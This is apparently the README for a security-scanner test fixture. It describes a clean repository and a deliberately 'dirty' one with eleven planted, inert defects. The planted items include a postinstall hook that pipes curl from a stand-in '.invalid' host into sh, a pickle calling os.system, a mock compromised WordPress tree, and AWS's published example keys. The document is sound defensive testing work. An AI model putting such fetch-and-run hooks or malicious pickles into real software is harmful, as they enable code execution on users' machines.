# Scan canaries

<!-- verified-against: 2026-10-13 5e582892 -->

Two repositories that exist to be scanned. One should come back clean; the other should come back
with exactly eleven known findings. Together they answer the question this project keeps running
into: **when a lane reports nothing, is that because there is nothing, or because nothing ran?**

Every taxonomy in this repo, `FALSE-CLEAN-TAXONOMY.md` among them, is about the two ways a scanner
lies. These fixtures are the control for both:

| | asks | catches |
|---|---|---|
| `clean/` | does the lane stay quiet when there is nothing to say? | **false positives** |
| `dirty/` | does the lane speak up when there is? | **false negatives** |

The second is the one that matters more and gets tested less, because a false negative looks
exactly like success.

## The clean canary is a real repository, deliberately

An empty directory scans clean for the wrong reason. `clean/` carries a manifest, a lockfile,
source, a Dockerfile and a CI workflow — the same five surfaces `dirty/` offends on — so that
silence from a lane is a statement about the *content* rather than about the absence of anything to
look at. `bin/test/scan-canary.test.mjs` asserts that correspondence: if the dirty tree grows a
surface the clean tree lacks, that lane has lost its negative control and the test fails.

## Nothing here is a real credential

Stated plainly because a file full of key-shaped strings deserves it:

- **`AKIAIOSFODNN7EXAMPLE` / `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`** — AWS's own published
  example pair, documented by AWS as non-functional and used verbatim throughout their
  documentation. It authenticates to nothing. It is here because a secret scanner that cannot find
  the canonical example key cannot find a real one.
- **The DSN** — key is thirty-two zeroes; the host is under `.invalid`, which RFC 2606 reserves so
  that it can never resolve.
- **`lodash@4.17.11`, `minimist@0.0.8`** — version strings in a manifest with no lockfile. Nothing
  is installed and nothing resolves them.
- **`dirty/wp-content/`** is the shape of an exploited WordPress tree with every payload made inert:
  `plugins/cw-canary.php.b64` decodes to PHP whose first statement is `exit;`, `.cw-canary-state`
  pairs a `pass` key holding the literal `canary-not-a-credential` with a filename that exists
  nowhere, `plugins/.htaccess` only denies, `uploads/2026/10/cw-canary.php` only `return`s, and
  `.user.ini` names an `auto_prepend_file` on no machine. PHP reads none of them: nothing serves
  `fixtures/`. `clean/wp-content/` carries the benign twin of each — a base64 body that decodes to
  JSON, a state file with no credential key, the ordinary `<Files *.php>` deny, the two inert data
  shapes plugins store under `uploads/`, and the directive only in a comment.
- **`dirty/wp-content/logs/`** holds two log lines `bin/log-evidence.mjs` must find: a query-log line
  extracting an option one character at a time, and an access-log line from the documentation
  range 192.0.2.0/24 for PHP under `uploads/`. They are text; nothing reads them as SQL or as
  requests. `*.log` is ignored repo-wide, so `.gitignore` re-includes `fixtures/scan-canary/**/*.log`.
- **`dirty/site-packages/`** is an installed Python package whose RECORD no longer matches it, for
  `bin/tree-integrity.mjs`: `cw_canary_pkg/__init__.py` carries a line appended after the hash was
  recorded, the RECORD lists `cw_canary_removed.py`, which was never written, and
  `cw_canary_extra.py` sits in the package directory with no RECORD line. Each module only assigns
  constants, and nothing puts `fixtures/` on a Python path. `clean/site-packages/` is the same
  package with a RECORD that verifies. `.gitattributes` marks both `-text`, because a CRLF checkout
  would change the bytes the RECORD hashes.
- **`dirty/wp-site/`** is a synthetic WordPress site root for `bin/wp-integrity.mjs` and
  `bin/wp-advisories.mjs`, read against **`wp-source/`**, an offline mirror of the three sources those
  lanes reach (checksums, the core release list and advisory records), all invented: core `0.0.1`
  and `0.0.2`, a plugin `cw-canary-plugin`, a theme `cw-canary-theme`, advisory ids `CW-CANARY-*`.
  The dirty site carries a changed core file, server code added under `wp-includes/` and inside the
  plugin, a changed plugin file, a text file loose in `plugins/`, and core, plugin and theme versions
  the synthetic advisories name. Every PHP file is text whose only statement is `return;`.
  `clean/wp-site/` is the same site byte-identical to its synthetic releases at the fixed versions,
  and must verify and look up clean. Both lanes run here with `CW_WP_OFFLINE=1` and the mirror as
  every source, so the canary never reaches the network.
- **The Dockerfile** is never built. **The workflows** are never triggered: GitHub reads workflows
  only from `.github/workflows` at the repository root, and these are four directories down.
  `dirty/.github/workflows/deploy.yml` names a `self-hosted` runner (none is registered to this
  repository), a `workflow_run` trigger on a workflow that exists only inside the fixture, and no
  `permissions:` block — the three `bin/actions-gaps.mjs` plants. `clean/deploy.yml` is the same
  job on `ubuntu-latest`, on `push`, with `permissions: contents: read`.
- **`injection.mjs`** is never imported and is reachable from no entry point.
- **`canary-install-hook`'s postinstall** (`curl -s https://example.invalid/x | sh`) is never run:
  nothing executes `npm install` under `fixtures/`, and the host is under `.invalid` so it could
  fetch nothing if something did. It lives under `dirty/node_modules/` because that is the path
  `bin/deps-content.mjs` reads a hook from (a lockfile carries only `hasInstallScript`, never the
  script), and `.gitignore` re-includes `fixtures/scan-canary/*/node_modules/` for exactly that.
  `clean/` carries the same surface with a benign `node ./build.js` hook.
- **`dirty/model.pkl`** is a 33-byte protocol-2 pickle whose opcode stream is `GLOBAL os.system`,
  a `'true'` argument, `TUPLE1`, `REDUCE`, `STOP`. It is never unpickled: nothing under this
  repository loads anything from `fixtures/`, `bin/model-artefacts.mjs` walks opcodes and never
  calls pickle, and the bytes were verified with `pickletools.genops` (a disassembler). Loaded, it
  would run the shell no-op `true` — do not load it to find out. `clean/model.pkl` is a real
  pickle of a small dict, so the clean tree walks the same surface. `dirty/dataset.yaml` carries a
  Jinja expression and an `s3://canary.invalid/` path in `data_files` that no loader reads;
  `dirty/src/hf_load.py` is never imported and contacts no hub.

## Do not fix the dirty fixture

Every defect in `dirty/` is planted and enumerated in [`EXPECTED.json`](EXPECTED.json). Tidying one
away is the failure mode this whole directory exists to prevent — the lane would then pass by
finding nothing in a file with nothing to find, and nobody would notice, because the run would go
green. `bin/test/scan-canary.test.mjs` asserts each plant is still physically present *before*
believing any scanner result about it, and that test is itself mutation-checked in both directions.

If a plant genuinely needs to go, remove it from `EXPECTED.json` in the same commit. A plant that
exists only in the manifest makes its lane look tested when it is not.

## The dirty tree is excluded from commitwork's own scan

A repository that plants eleven defects in itself and then reports eleven findings has told you
nothing about itself. `dirty/` is excluded from the repo-wide sweep and reached only when the
scanners are pointed at it deliberately.

That is an exclusion, not a suppression: the findings are still asserted, just somewhere that
means something. `clean/` is **not** excluded — it is the negative control, and hiding it would
make its silence worthless.

`EXPECTED.json` carries a `selfScanExclusions.outstanding` list naming the lanes that do **not**
yet have that exclusion wired. Only `.gitleaks.toml` is done. The list is there rather than a
claim of completeness because an exclusion list that implies more coverage than it has is the same
defect class as a false clean.

## Running them

```sh
node --test bin/test/scan-canary.test.mjs        # the fixtures are still what they claim
```

The contract test asks no scanner anything — it establishes the premise that scanner results
depend on. Pointing the fleet at these trees belongs in a sweep, not a unit test.
